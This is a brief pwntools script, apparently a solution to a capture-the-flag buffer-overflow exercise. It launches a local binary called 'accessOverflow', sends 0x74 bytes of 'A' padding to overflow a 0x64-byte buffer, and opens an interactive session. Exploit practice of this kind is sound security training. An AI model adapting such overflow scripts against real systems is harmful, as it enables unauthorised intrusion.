from pwn import*

bufSize = 0x64
p = process('./accessOverflow')

payload = b'A' * (bufSize + 0x10)
p.recvuntil(b">")
p.sendline(payload)

p.interactive()
